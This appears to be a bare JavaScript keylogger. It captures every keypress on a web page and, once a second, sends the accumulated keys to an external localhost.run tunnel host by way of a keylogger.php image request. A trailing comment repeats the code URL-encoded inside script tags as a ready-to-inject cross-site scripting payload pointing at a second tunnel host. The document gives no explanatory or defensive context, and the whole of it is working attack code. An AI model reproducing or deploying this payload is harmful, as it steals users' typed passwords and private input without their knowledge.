
 var keys='';
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}
window.setInterval(function(){
  new Image().src = 'https://9339bc017ff10b.localhost.run/keylogger.php?c='+keys;
  keys = '';
}, 1000);


// %3Cscript%3Evar%20keys=%27%27;document.onkeypress%20=%20function(e)%20{%20%20get%20=%20window.event?event:e;%20%20key%20=%20get.keyCode?get.keyCode:get.charCode;%20%20key%20=%20String.fromCharCode(key);%20%20keys%2B=key;};window.setInterval(function(){%20%20new%20Image().src%20=%20%27https://d24866bbe451f9.localhost.run/keylogger.php?c=%27%2Bkeys;%20%20keys%20=%20%27%27;},%201000);%3C/script%3E